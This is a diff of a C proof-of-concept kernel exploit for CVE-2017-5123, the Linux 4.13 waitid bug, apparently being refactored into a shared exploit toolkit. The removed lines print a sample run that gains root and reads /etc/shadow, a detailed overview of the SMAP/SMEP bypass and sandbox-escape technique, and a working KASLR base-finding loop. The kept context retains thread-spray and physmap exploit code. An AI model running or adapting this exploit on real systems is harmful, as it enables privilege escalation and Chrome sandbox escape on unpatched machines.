@@ -1,88 +1,5 @@
 // CVE-2017-5123
 
-// Proof of concept exploit for waitid bug introduced in Linux Kernel 4.13
-// By Chris Salls  (twitter.com/chris_salls)
-// This exploit can be used to break out out of sandboxes such as that in google chrome
-// In this proof of concept we install the seccomp filter from chrome as well as a chroot,
-// then break out of those and get root
-// Bypasses smep and smap, but is somewhat unreliable and may crash the kernel instead
-// offsets written and tested on ubuntu 17.10-beta2
-/*
-salls@ubuntu:~/x$ uname -a
-Linux ubuntu 4.13.0-12-generic #13-Ubuntu SMP Sat Sep 23 03:40:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
-salls@ubuntu:~/x$ gcc poc_smap_bypass.c -lpthread -o poc
-salls@ubuntu:~/x$ ./poc
-Installed sandboxes. Seccomp, chroot, uid namespace
-for spray assuming task struct size is 5952
-check in /sys/kernel/slab/task_struct/object_size to make sure this is right
-If it's wrong the exploit will fail
-found kernel base 0xffffffff87600000
-found mapping at 0xffff8eb500000000
-found mapping end at 0xffff8eb5a0000000
-9999 threads created
-found second mapping at 0xffff8eb600000000
-found second mapping end at 0xffff8eb750000000
-last_mapping is 0x150000000 bytes
-min guess ffff8eb650000000
-starting guessing
-this part can take up to a minute, or crash the machine :)
-found my task at 0xffff8eb67555dd00
-joining threads
-part 2 start
-mapped 0x100000000
-trying to find physmap mapping
-found mapping at 0xffff8eb500000000
-f213000 changed to 0
-page locked!
-detected change at 0xffff8eb658000000
-physmap addr is good
-here we go
-trying to call system...
-# id
-uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(lpadmin),128(sambashare),1000(salls)
-# head /etc/shadow
-root:!:17447:0:99999:7:::
-daemon:*:17435:0:99999:7:::
-*/
-
-/****** overview of exploit ********
-waitid uses unsafe_put_user without checking access_ok,
-allowing the user to give a kernel address for infop and write over kernel memory.
-when given invalid parameters this just writes the following 32 bit integers
-0, 0, 0, _, 0, 0, 0
-(the 4th element is unchanged)
-inside the chrome sandbox we cannot fork (can only make threads)
-so we can only give invalid parameters to waitid and only write 0's to kernel memory,
-
-To exploit this in the presence of smap:
-
-I start out by iteratively calling waitid until we find the kernel's base address
-When it's found it will not return efault error from the syscall
-
-Now, I can only write 0's at this point, so I spray 10000 threads and attempt
-to write 0's over the beginning of the task struct to unset the seccomp flag
-This part is kind of unreliable and depends on the size of the task struct which
-changes based on cpu.
-
-If it succceeds, I now know where the task struct is and no longer have seccomp
-By shifting the location of the write and using the pid of the child process, I
-can now write 5 consecutive arbitrary non-zero bytes. So I can create an address
-with this bitmask 0xffffffffff000000
-
-Now to create data at such an address I use the physmap, a mirror of all userland
-pages that exists in kernel memory. Mmap a large amount of memory, try writing at
-various places in the physmap until we see userland memory change. Then mlock that
-page.
-
-With controlled data in the kernel, I use the 5 byte write described above to change
-our task->files to point at the controlled page. This give me control of the file
-operations and arbitrary read/write.
-
-From here, I remove the chroot and edit my creds to make that thread root.
-*/
-
-
-
 #define _GNU_SOURCE
 #include <stdlib.h>
 #include <errno.h>
@@ -110,6 +27,8 @@ From here, I remove the chroot and edit my creds to make that thread root.
 #include <limits.h>
 #include <sys/ioctl.h>
 
+#include "pwn.h"
+#include "toolset.h"
 
 #define PR_SET_NO_NEW_PRIVS     38
 #define __NR_seccomp 317
@@ -187,12 +106,6 @@ From here, I remove the chroot and edit my creds to make that thread root.
 #define OFFSET_LSEEK 1
 #define OFFSET_IOCTL 9
 
-// 4.13+
-
-// where read/write data is in kernel
-// had to play with last 3 nibbles to get it to not crash
-#define start_rw_off 0x9f5fe0
-
 // a global for the f_op in userspace
 unsigned long *f_op;
 
@@ -201,150 +114,13 @@ struct PagePair {
   unsigned long kernel_page;
 };
 
-unsigned long kernel_base;
+extern unsigned long kernel_base;
 void do_exploit_2(unsigned long task_addr);
 void get_physmap(struct PagePair *pp);
 
 // global for threads
 #define NUM_THREAD_SPRAY 10000
 pthread_t g_threads[NUM_THREAD_SPRAY];
-
-/********** HELPERS *************/
-void raw_input() {
-  int i;
-  printf("> ");
-  read(0, (char*)&i, 4);
-}
-
-
-int write_file(const char* file, const char* what, ...)
-{
-  char buf[1024];
-  va_list args;
-  va_start(args, what);
-  vsnprintf(buf, sizeof(buf), what, args);
-  va_end(args);
-  buf[sizeof(buf) - 1] = 0;
-  int len = strlen(buf);
-
-  int fd = open(file, O_WRONLY | O_CLOEXEC);
-  if (fd == -1) {
-    perror("open");
-    return 0;
-  }
-  if (write(fd, buf, len) != len) {
-    close(fd);
-    return 0;
-  }
-  close(fd);
-  return 1;
-}
-
-static inline void native_cpuid(unsigned int *eax, unsigned int *ebx,
-                                unsigned int *ecx, unsigned int *edx)
-{
-    /* ecx is often an input as well as an output. */
-    asm volatile("cpuid"
-        : "=a" (*eax),
-          "=b" (*ebx),
-          "=c" (*ecx),
-          "=d" (*edx)
-        : "0" (*eax), "2" (*ecx));
-}
-
-void install_mock_chrome_sandbox() {
-  char *buffer = NULL;
-  long length;
-  FILE *f = fopen ("chrome_seccomp_filter", "rb");
-
-  if (f)
-  {
-    fseek(f, 0, SEEK_END);
-    length = ftell (f);
-    fseek(f, 0, SEEK_SET);
-    buffer = malloc(length);
-    if (buffer)
-    {
-      fread(buffer, 1, length, f);
-    }
-    fclose(f);
-  }
-  else {
-    printf("couldn't open chrome_seccomp_filter\n");
-    exit(-1);
-  }
-  if (length%8 != 0) {
-    printf("length mod 8 != 0?\n");
-    exit(-1);
-  }
-  
-  // set up namespace
-  int real_uid = 1000;
-  int real_gid = 1000;
-  int has_newuser = 1;
-  if (unshare(CLONE_NEWUSER) != 0) {
-    perror("unshare(CLONE_NEWUSER)");
-    printf("no new user...\n");
-    has_newuser = 0;
-  }
-
-  if (unshare(CLONE_NEWNET) != 0) {
-    perror("unshare(CLONE_NEWUSER)");
-    exit(EXIT_FAILURE);
-  }
-
-  if (has_newuser && !write_file("/proc/self/setgroups", "deny")) {
-    perror("write_file(/proc/self/set_groups)");
-    exit(EXIT_FAILURE);
-  }
-  if (has_newuser && !write_file("/proc/self/uid_map", "1000 %d 1\n", real_uid)){
-    perror("write_file(/proc/self/uid_map)");
-    exit(EXIT_FAILURE);
-  }
-  if (has_newuser && !write_file("/proc/self/gid_map", "1000 %d 1\n", real_gid)) {
-    perror("write_file(/proc/self/gid_map)");
-    exit(EXIT_FAILURE);
-  }
-  
-  // chroot
-  if (chroot("/proc/self/fdinfo")) {
-    perror("chroot");
-    exit(EXIT_FAILURE);
-  }
-  // remove .?
-  // how did they remove that dir..
-    
-  // set uid
-  if (!has_newuser){
-    if (setgid(1000)) {
-      perror("setgid");
-      exit(EXIT_FAILURE);
-    }
-    if (setuid(1000)) {
-      perror("setuid");
-      exit(EXIT_FAILURE);
-    }
-  }
-  
-  // no new privs
-  int res = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
-  if (res) {
-    printf("no new privs failed? %d\n", res);
-  }
-
-  // filter
-  struct sock_fprog prog = {
-     .len = (unsigned short) (length/8),
-     .filter = (void*)buffer,
-  };
-
-  // install filter
-  if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog)) {
-     perror("seccomp");
-     exit(-2);
-  }
-  printf("Installed sandboxes. Seccomp, chroot, uid namespace\n");
-}
 
 // futex wrapper
 static int futex(void *uaddr, int futex_op, int val, 
@@ -356,26 +132,6 @@ static int futex(void *uaddr, int futex_op, int val,
 /***********EXPLOIT CODE************/
 
 pthread_attr_t thread_attr;
-
-unsigned long get_base() {
-  // first we try doing our arb write to find the system base address
-  // if syscall is 0 we didn't fault
-  unsigned long start = 0xffffffff00000000;
-  unsigned long inc =   0x0000000000100000;
-  unsigned long guess = start;
-  while (guess != 0) {
-    int res = syscall(SYS_waitid, P_ALL, 0, guess+start_rw_off, WEXITED, NULL);
-    if (errno != 14) {
-      printf("found kernel base 0x%lx\n", guess);
-      kernel_base = guess;
-      return guess;
-    }
-    
-    guess += inc;
-  }
-  printf("failed to find base address...");
-  return -1;
-}
 
 int threads_run;
 int barrier2;
@@ -961,46 +717,18 @@ void get_physmap(struct PagePair *pp) {
 
 int main() {
 
-  install_mock_chrome_sandbox();
-
   setvbuf(stdout, NULL, _IONBF, 0);
   srand(time(NULL));
 
-  // set thread size smaller
-  pthread_attr_init(&thread_attr);
-  if(pthread_attr_setstacksize(&thread_attr, 0x10000)) {
-    printf("set stack size error\n");
-    return 0;
-  }
-
-  // get cpuid info so we know size of task_struct
-  int eax,ebx,ecx,edx;
-  eax=0xd;
-  ebx = ecx = edx = 0;
-  native_cpuid(&eax, &ebx, &ecx, &edx);
-  int xsave_size = ebx;
-
-  if(xsave_size == 0x340) {
-    spray_offset = 0x55dd00;
-    printf("for spray assuming task struct size is 5952\n");
-  }
-  else if(xsave_size == 0x440) {
-    spray_offset = 0x5448c0;
-    printf("for spray assuming task struct size is 6208\n");
-  }
-  else {
-    printf("unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\n");
-    return 0;
-  }
-  printf("check in /sys/kernel/slab/task_struct/object_size to make sure this is right\n");
-  printf("If it's wrong the exploit will fail\n");
-
-  unsigned long base = get_base();
+#if(ENABLE_KASLR_BYPASS == 1)
+  unsigned long base = get_kernel_base();
   if (base == -1) {
     return -1;
   }
+#else
+  kernel_base = KERNEL_BASE_DEFAULT;
+#endif
 
-  unseccomp();
+  // unseccomp();
   return 0;
-
 }
